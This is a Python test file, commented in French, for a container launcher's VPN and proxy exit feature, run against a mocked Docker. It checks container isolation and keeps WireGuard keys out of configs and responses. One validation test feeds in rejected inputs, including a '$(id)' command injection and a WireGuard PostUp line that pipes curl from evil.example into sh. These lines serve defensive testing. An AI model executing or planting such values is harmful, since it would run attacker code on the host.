"""Sortie réseau (lot sortie-reseau) : ce que le lanceur crée, avec un Docker simulé.

    docker run --rm -v "$PWD/launcher:/launcher:ro" -v "$PWD/tests:/tests:ro" python:3.12-slim sh -c \
      "pip install -q fastapi pydantic httpx && python /tests/sortie/lanceur_test.py"

Sans sortie configurée : aucun conteneur de plus, le navigateur est créé comme avant. Avec : la maison (le relais de l'ordinateur, sans conteneur),
VPN (Gluetun, le seul qui demande NET_ADMIN), aiguillage ; les secrets ne passent que par un fichier du conteneur ; le navigateur reçoit PROXY_*.
"""
import io
import json
import os
import tarfile
import sys
import tempfile
from unittest.mock import MagicMock

docker = MagicMock(name="docker")
docker.errors.NotFound = type("NotFound", (Exception,), {})
docker.errors.APIError = type("APIError", (Exception,), {})
docker.errors.ImageNotFound = type("ImageNotFound", (Exception,), {})
sys.modules.update({"docker": docker, "docker.errors": docker.errors, "docker.types": docker.types})
os.environ.update(LAUNCHER_KEY="k", AGENT_NETWORK="noah-agents", NOAH_UPDATES_DIR=tempfile.mkdtemp(), NOAH_UPDATE_STATE=tempfile.mkdtemp() + "/updates.json")
sys.path.insert(0, "/launcher")
import launcher  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

NotFound = docker.errors.NotFound
WG_PUB = "ZyXwVuTsRqPoNnMlKjIhGfEdCb9876543210+/zYxWv="
WG_KEY = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789+/AbCdE="


class Fake:
    """Un conteneur Docker simulé."""

    def __init__(self, name, labels, status="created", **kw):
        self.name, self.labels, self.status, self.kw = name, labels, status, kw
        self.image = kw.get("image_obj")  # l image du lanceur, pour l aiguillage
        self.attrs = {"NetworkSettings": {"Networks": {}}}
        self.connected = []

    def start(self):
        self.status = "running"

    def stop(self, **k):
        self.status = "exited"

    def remove(self, **k):
        world.containers.pop(self.name, None)

    def exec_run(self, cmd, **k):
        return MagicMock(exit_code=0, output=json.dumps({"active": "maison", "sorties": [], "bascules": [], "inactif": True}).encode())

    def put_archive(self, *a):
        pass

    def get_archive(self, path):  # la config de Firefox que le lanceur complète avant le démarrage
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tar:
            info = tarfile.TarInfo("camoufox.cfg")
            info.size = 3
            tar.addfile(info, io.BytesIO(b"//x"))
        return iter([buf.getvalue()]), {}


class World:
    def __init__(self):
        self.containers, self.networks, self.volumes, self.created, self.keys = {}, set(), {"noah-sortie-maison"}, [], []


world = World()
client = launcher.client


def get(name):
    if name not in world.containers:
        raise NotFound()
    return world.containers[name]


def create(image, **kw):
    c = Fake(kw["name"], kw.get("labels", {}), **{k: v for k, v in kw.items() if k not in ("name", "labels")})
    c.image_ref = image
    world.containers[c.name] = c
    world.created.append((c.name, image, kw))
    return c


def lister(all=False, filters=None):
    wanted = (filters or {}).get("label")
    return [c for c in world.containers.values() if wanted in c.labels]


client.containers.get.side_effect = get
client.containers.create.side_effect = create
client.containers.list.side_effect = lister
client.networks.get.side_effect = lambda n: (_ for _ in ()).throw(NotFound()) if n not in world.networks and n != "noah-agents" else MagicMock(name=n)
client.networks.create.side_effect = lambda n, **k: world.networks.add(n)
client.volumes.get.side_effect = lambda n: MagicMock(remove=lambda: world.volumes.discard(n))
client.images.get.return_value = MagicMock(attrs={"Config": {"Entrypoint": ["/usr/bin/entrypoint"], "Cmd": ["node", "server.js"]}})
client.info.return_value = {"NCPU": 2, "MemTotal": 4 * 2**30}
launcher._cores.cache_clear()
launcher._ram.cache_clear()
world.containers["noah-launcher"] = Fake("noah-launcher", {}, "running", image_obj="image-du-lanceur")
launcher.updater.put_env = lambda c, path, values: world.keys.append((c.name, path, dict(values)))
launcher.container = lambda agent_id: None
launcher._ensure_agents_network = lambda: None
launcher.time.sleep = lambda s: None
web = TestClient(launcher.app, raise_server_exceptions=False, headers={"Authorization": "Bearer k"})


def navigateur(**kw):
    """Crée le navigateur de l'agent « essai » de bout en bout (Docker simulé) et rend les arguments de sa création."""
    world.created.clear()
    world.containers.pop("noah-browser-essai", None)
    client.containers.create.side_effect = create
    launcher._ensure_browser("essai", launcher.BrowserKeys(api_key="a", vnc_password="b", **kw))
    return next(x for x in world.created if x[0] == "noah-browser-essai")[2]


# 1. Sans sortie : aucun conteneur de plus, le navigateur est celui d'avant (même étiquette, pas de PROXY_*).
kw = navigateur(locale="fr-FR", timezone="Europe/Paris")
assert not any(k.startswith("PROXY_") for k in kw["environment"]), kw["environment"]
assert kw["labels"]["noah.browser.version"] == f"{launcher.BROWSER_VERSION}:fr-FR:Europe/Paris", kw["labels"]
assert [n for n, *_ in world.created] == ["noah-browser-essai"] and not launcher._sortie_ready()
r = web.get("/sortie")
assert r.status_code == 200 and r.json() == {"conteneurs": {"noah-sortie-maison": False, "noah-sortie-vpn": False, "noah-sortie": False}, "aiguillage": None}, r.text
r = web.put("/sortie", json={})
assert r.status_code == 200 and not [c for n, c in world.containers.items() if n.startswith("noah-sortie")], "configuration vide : rien n'est créé"
print("1. sans sortie configurée : aucun conteneur de plus, navigateur identique à celui d'avant")

# 2. Maison (le relais de l'ordinateur) et VPN : un seul conteneur de sortie (Gluetun) plus l'aiguillage ; rien de Tailscale.
world.created.clear()
r = web.put("/sortie", json={"maison": {"actif": True}, "vpn": {"cle_privee": WG_KEY, "adresse": "10.14.0.2/16", "ville": "Montreal"}})
assert r.status_code == 200, r.text
creations = {n: (img, kw) for n, img, kw in world.created}
assert set(creations) == {"noah-sortie-vpn", "noah-sortie"}, f"la maison n'a plus de conteneur : {list(creations)}"
for nom, (img, kw) in creations.items():
    assert kw["cap_drop"] == ["ALL"] and kw["security_opt"] == ["no-new-privileges"], nom
    assert kw["pids_limit"] and kw["mem_limit"] and kw["log_config"], f"{nom} : limites comme les autres conteneurs"
    assert "volumes" not in kw or all("docker.sock" not in str(v) for v in kw["volumes"]), nom
    assert not kw.get("privileged") and "network_mode" not in kw and "ports" not in kw, f"{nom} : rien publié, rien de privilégié"
assert "@sha256:" in creations["noah-sortie-vpn"][0] and creations["noah-sortie-vpn"][0].startswith("qmcgaw/gluetun@"), "image figée par empreinte"
assert not any("tailscale" in str(c).lower() for c in world.created), "plus aucune trace de Tailscale dans ce que le lanceur crée"
vpn, aig = creations["noah-sortie-vpn"][1], creations["noah-sortie"][1]
assert vpn["cap_add"] == ["NET_ADMIN"] and vpn["devices"] == ["/dev/net/tun:/dev/net/tun:rwm"], "le VPN est le seul à demander NET_ADMIN et /dev/net/tun"
assert vpn["environment"]["VPN_SERVICE_PROVIDER"] == "surfshark" and vpn["environment"]["VPN_TYPE"] == "wireguard"
assert vpn["environment"]["SERVER_CITIES"] == "Montreal" and vpn["environment"]["HTTPPROXY"] == "on"
assert "cap_add" not in aig and aig["read_only"] and aig["user"] == "65534:65534" and aig["network"] == "noah-agents"
assert creations["noah-sortie"][0] == "image-du-lanceur" and aig["command"] == ["python", "/app/aiguillage.py"]
amont = json.loads(aig["environment"]["NOAH_SORTIE_AMONT"])
assert [(s["nom"], s["hote"], s["port"]) for s in amont] == [("maison", "noah-server", 3130), ("vpn", "noah-sortie-vpn", 8888)], "la maison (le serveur, port du relais) d'abord"
assert not any(k in str(aig["environment"]) for k in ("TS_AUTHKEY", "WIREGUARD")), "l'aiguillage ne connaît aucune clé"
print("2. la maison n'a plus de conteneur (le serveur, port 3130) ; VPN (Gluetun, NET_ADMIN et tun seulement) et aiguillage : images figées, isolement, ordre")

# 3. Le secret du VPN : dans un fichier du conteneur, nulle part ailleurs (ni config Docker, ni étiquette, ni réponse, ni journal).
assert ("noah-sortie-vpn", "/noah.env", {"WIREGUARD_PRIVATE_KEY": WG_KEY}) in world.keys
tout = json.dumps([(n, i, {k: v for k, v in kw.items() if k != "image_obj"}) for n, i, kw in world.created], default=str)
assert WG_KEY not in tout, "une clé est dans la config Docker d'un conteneur"
assert WG_KEY not in r.text and WG_KEY not in web.get("/sortie").text, "une clé est dans une réponse du lanceur"
import re  # noqa: E402
assert re.fullmatch(r"[\w.+/=-]*", WG_KEY), "put_env (updater.py) accepte cette forme de clé"
print("3. la clé Surfshark ne passe que par put_env (fichier du conteneur) : ni config Docker, ni étiquette, ni réponse")

# 4. Le navigateur créé ensuite passe par l'aiguillage, et son étiquette le dit.
assert launcher._sortie_ready()
kw = navigateur(locale="fr-CA", timezone="America/Toronto")
env = kw["environment"]
assert (env["PROXY_HOST"], env["PROXY_PORT"], env["PROXY_PROTOCOL"]) == ("noah-sortie", "3128", "http"), env
assert "PROXY_USERNAME" not in env and "PROXY_PASSWORD" not in env
assert kw["labels"]["noah.browser.version"] == f"{launcher.BROWSER_VERSION}:fr-CA:America/Toronto:s"
assert kw["cap_drop"] == ["ALL"] and not kw.get("cap_add")
print("4. le navigateur reçoit PROXY_HOST=noah-sortie, PROXY_PORT, étiquette « :s »")

# 4 bis. Un navigateur sans proxy, une sortie ensuite configurée : recréé. Avec proxy, une identité vide le garde.
nav = world.containers["noah-browser-essai"]
nav.labels = {launcher.BROWSER_LABEL: "essai", "noah.browser.version": f"{launcher.BROWSER_VERSION}:fr-CA:America/Toronto:s"}
nav.status = "exited"
n_avant = len(world.created)
r = launcher._ensure_browser("essai", launcher.BrowserKeys(api_key="a", vnc_password="b"))
assert r == {"host": "noah-browser-essai", "created": False} and nav.status == "running" and len(world.created) == n_avant, "identité vide : le navigateur en place est gardé"
nav.labels["noah.browser.version"] = f"{launcher.BROWSER_VERSION}:fr-CA:America/Toronto"  # créé avant la sortie
assert not launcher._version_proxy(nav.labels["noah.browser.version"]) and launcher._version_proxy(nav.labels["noah.browser.version"] + ":s")
nav.status = "exited"
launcher._ensure_browser("essai", launcher.BrowserKeys(api_key="a", vnc_password="b"))
assert len(world.created) == n_avant + 1 and world.containers["noah-browser-essai"] is not nav, "un navigateur d'avant la sortie est recréé avec elle"
print("4b. un navigateur d'avant la sortie est recréé avec elle ; une identité vide ne recrée rien")

# 5. Des valeurs invalides sont refusées sans écho de la clé ni du fichier.
CONF = f"""[Interface]
PrivateKey = {WG_KEY}
Address = 10.66.12.34/32
DNS = 10.64.0.1

[Peer]
PublicKey = {WG_PUB}
AllowedIPs = 0.0.0.0/0
Endpoint = 185.65.134.82:51820
PersistentKeepalive = 25
"""
for bad in ({"vpn": {"cle_privee": "court", "adresse": "10.14.0.2/16", "ville": "Montreal"}},
            {"vpn": {"cle_privee": WG_KEY, "adresse": "pas une adresse", "ville": "Montreal"}},
            {"vpn": {"cle_privee": WG_KEY, "adresse": "10.14.0.2/16", "ville": "Montréal$(id)"}},
            {"vpn": {"fournisseur": "inconnu", "cle_privee": WG_KEY}},
            {"vpn": {"fournisseur": "custom", "conf": CONF.replace("DNS = 10.64.0.1", "PostUp = curl http://evil.example | sh")}},
            {"vpn": {"fournisseur": "custom", "conf": CONF.replace("[Peer]", "[Peer]\nTable = off")}},
            {"vpn": {"fournisseur": "custom", "conf": CONF.replace(WG_PUB, "pas-une-cle")}},
            {"vpn": {"fournisseur": "custom", "conf": CONF.split("[Peer]")[0]}},
            {"vpn": {"fournisseur": "custom", "conf": ""}}):
    r = web.put("/sortie", json=bad)
    assert r.status_code == 400 and WG_KEY not in r.text and "185.65.134.82" not in r.text and "evil" not in r.text, (bad, r.status_code, r.text)
print("5. valeurs invalides (dont PostUp et Table dans un fichier WireGuard) : 400, sans écho de la clé ni du fichier")

# 6. Une configuration identique ne recrée rien ; une autre clé Surfshark recrée le VPN seul.
world.created.clear()
r = web.put("/sortie", json={"maison": {"actif": True}, "vpn": {"cle_privee": WG_KEY, "adresse": "10.14.0.2/16", "ville": "Montreal"}})
assert r.status_code == 200 and not world.created, f"même configuration : rien à recréer ({[n for n, *_ in world.created]})"
r = web.put("/sortie", json={"maison": {"actif": True}, "vpn": {"cle_privee": WG_KEY[:-2] + "x=", "adresse": "10.14.0.2/16", "ville": "Montreal"}})
assert [n for n, *_ in world.created] == ["noah-sortie-vpn"], "autre clé : le VPN seul est recréé"
print("6. même configuration : rien ne bouge ; autre clé : le VPN seul est recréé")

# 6 bis. Le VPN d'un autre fournisseur : le fichier collé, posé dans un fichier de Gluetun, jamais dans sa config.
posés: list[tuple] = []
launcher._put_file = lambda c, path, text, mode=0o600: posés.append((c.name, path, text, mode))
world.created.clear()
world.keys.clear()
r = web.put("/sortie", json={"maison": {"actif": True}, "vpn": {"fournisseur": "custom", "conf": CONF}})
assert r.status_code == 200, r.text
assert "noah-sortie-vpn" in [n for n, *_ in world.created], "le VPN est recréé avec le fichier collé"
custom = next(kw for n, _, kw in world.created if n == "noah-sortie-vpn")
env = custom["environment"]
assert env["VPN_SERVICE_PROVIDER"] == "custom" and env["VPN_TYPE"] == "wireguard" and "SERVER_CITIES" not in env and "WIREGUARD_ADDRESSES" not in env, env
assert custom["cap_add"] == ["NET_ADMIN"] and custom["devices"] == ["/dev/net/tun:/dev/net/tun:rwm"]
assert len(posés) == 1 and posés[0][:2] == ("noah-sortie-vpn", "/gluetun/wireguard/wg0.conf") and posés[0][3] == 0o600, posés
fichier = posés[0][2]
assert f"PrivateKey = {WG_KEY}" in fichier and "Endpoint = 185.65.134.82:51820" in fichier and "AllowedIPs = 0.0.0.0/0" in fichier
assert "DNS" not in fichier and "PersistentKeepalive" not in fichier, "réécrit avec les seules lignes utiles"
assert world.keys == [("noah-sortie-vpn", "/noah.env", {})], "le fichier d'environnement du point d'entrée existe, vide : aucune clé dedans"
tout = json.dumps([(n, i, {k: v for k, v in kw.items() if k != "image_obj"}) for n, i, kw in world.created], default=str)
assert WG_KEY not in tout and "185.65.134.82" not in tout and WG_PUB not in tout, "le fichier est dans la config Docker du conteneur"
assert WG_KEY not in r.text and "185.65.134.82" not in r.text and WG_KEY not in web.get("/sortie").text, "le fichier revient dans une réponse"
world.created.clear()
r = web.put("/sortie", json={"maison": {"actif": True}, "vpn": {"fournisseur": "custom", "conf": CONF}})
assert r.status_code == 200 and not world.created, "même fichier : rien n'est recréé"
print("6b. VPN d'un autre fournisseur : Gluetun « custom », le fichier posé dans /gluetun/wireguard/wg0.conf (600), nulle part ailleurs")

# 7. La maison retirée : plus de voie « maison » pour l'aiguillage, qui n'a plus que le VPN.
r = web.put("/sortie", json={"vpn": {"fournisseur": "custom", "conf": CONF}})
assert r.status_code == 200 and "noah-sortie-vpn" in world.containers
assert world.containers["noah-sortie"].labels["noah.sortie.amont"] == "vpn"
print("7. la maison retirée : l'aiguillage n'a plus que le VPN")

# 7b. L'ancienne maison (Tailscale) : retirée avec son état à la première configuration, et au démarrage du lanceur, y compris dans
# l'aiguillage qui la comptait encore.
world.containers["noah-sortie-maison"] = Fake("noah-sortie-maison", {launcher.SORTIE_LABEL: "maison"}, "running")
world.volumes.add("noah-sortie-maison")
r = web.put("/sortie", json={"vpn": {"fournisseur": "custom", "conf": CONF}})
assert r.status_code == 200 and "noah-sortie-maison" not in world.containers and "noah-sortie-maison" not in world.volumes, "le conteneur et l'état Tailscale partent"
world.containers["noah-sortie-maison"] = Fake("noah-sortie-maison", {launcher.SORTIE_LABEL: "maison"}, "running")
world.volumes.add("noah-sortie-maison")
vieux = [{"nom": "maison", "hote": "noah-sortie-maison", "port": 1056}, {"nom": "vpn", "hote": "noah-sortie-vpn", "port": 8888}]
world.containers["noah-sortie"].attrs["Config"] = {"Env": ["NOAH_SORTIE_AMONT=" + json.dumps(vieux)]}
world.containers["noah-sortie"].labels["noah.sortie.config"] = "ancienne"
world.created.clear()
launcher._sortie_legacy()
assert "noah-sortie-maison" not in world.containers and "noah-sortie-maison" not in world.volumes, "démarrage : l'ancienne maison est retirée"
nouvel = next(kw for n, _, kw in world.created if n == "noah-sortie")
assert [s["nom"] for s in json.loads(nouvel["environment"]["NOAH_SORTIE_AMONT"])] == ["vpn"], "l'aiguillage est refait sans elle"
launcher._sortie_legacy()
assert len([1 for n, *_ in world.created if n == "noah-sortie"]) == 1, "rejoué : plus rien à faire"
print("7b. l'ancienne maison Tailscale : conteneur et état retirés, aiguillage refait sans elle, rien rejoué ensuite")

# 8. Tout retiré : un navigateur encore sur le proxy garde l'aiguillage (vidé), puis il part quand plus aucun ne s'y accroche.
client.containers.get.side_effect = get
web.put("/sortie", json={})
assert "noah-sortie-vpn" not in world.containers
assert "noah-sortie" in world.containers and world.containers["noah-sortie"].labels["noah.sortie.amont"] == "", \
    "un navigateur créé avec le proxy tient encore à l'aiguillage : il reste, vidé (direct seulement)"
assert not launcher._sortie_ready(), "vidé : les navigateurs créés maintenant ne passent plus par lui"
world.containers["noah-browser-essai"].labels["noah.browser.version"] = f"{launcher.BROWSER_VERSION}:fr-FR:Europe/Paris"
navigateur(locale="fr-FR", timezone="Europe/Paris")
assert "noah-sortie" not in world.containers, "plus aucun navigateur sur le proxy : l'aiguillage part"
print("8. tout retiré : l'aiguillage reste vidé tant qu'un navigateur s'y accroche, puis part")

# 9. Mise à jour en cours : refusé comme les autres opérations sur le parc.
etat = launcher.updater.load_state
launcher.updater.load_state = lambda: {"en_cours": {"phase": "application"}, "gardes": []}
assert web.put("/sortie", json={}).status_code == 409
launcher.updater.load_state = etat
r = TestClient(launcher.app).put("/sortie", json={})
assert r.status_code in (401, 403, 422), "sans clé du lanceur : refusé"
print("9. refusé pendant une mise à jour et sans la clé du lanceur")
print("OK : lanceur, sortie réseau")
